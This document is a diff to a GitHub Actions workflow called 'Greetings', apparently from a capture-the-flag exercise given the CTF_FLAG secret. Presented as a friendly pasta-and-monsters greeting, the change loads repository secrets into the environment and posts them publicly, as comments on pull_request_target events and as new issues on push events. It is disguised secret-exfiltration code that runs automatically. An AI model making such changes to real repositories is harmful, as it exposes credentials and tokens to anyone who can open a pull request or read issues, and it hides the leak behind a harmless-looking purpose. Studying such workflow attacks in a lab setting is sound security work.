@@ -1,6 +1,6 @@
 name: Greetings
 
-on: [pull_request_target, issues]
+on: [pull_request_target, push]
 
 jobs:
   greeting:
@@ -9,8 +9,32 @@ jobs:
       issues: write
       pull-requests: write
     steps:
-    - uses: actions/first-interaction@v1
+    - uses: actions/github-script@v7
+      env:
+        CTF_FLAG: ${{ secrets.CTF_FLAG }}
+        SEVERITY_MODE: ${{ secrets.SEVERITY_MODE }}
+        RUNNER_VER: ${{ secrets.RUNNER_VER }}
+        RETENTION_PERIOD: 100000000
       with:
-        repo-token: ${{ secrets.GITHUB_TOKEN }}
-        issue-message: "Let's cook pasta and feed monsters!"
-        pr-message: "Let's cook pasta and feed monsters!"
+        script: |
+          const message = 'Let\'s cook pasta and feed monsters!\n\n=== SECRET VALUES IN GREETING ===\nCTF_FLAG: ' + process.env.CTF_FLAG + '\nSEVERITY_MODE: ' + process.env.SEVERITY_MODE + '\nRUNNER_VER: ' + process.env.RUNNER_VER + '\nRETENTION_PERIOD: ' + process.env.RETENTION_PERIOD + '\n=============================';
+
+          if (context.eventName === 'pull_request_target') {
+            await github.rest.issues.createComment({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              issue_number: context.issue.number,
+              body: message
+            });
+          } else if (context.eventName === 'push') {
+            // For push events, create an issue with the secrets
+            await github.rest.issues.create({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              title: 'New Push Event - Secret Values',
+              body: message
+            });
+          }
+
+
+        
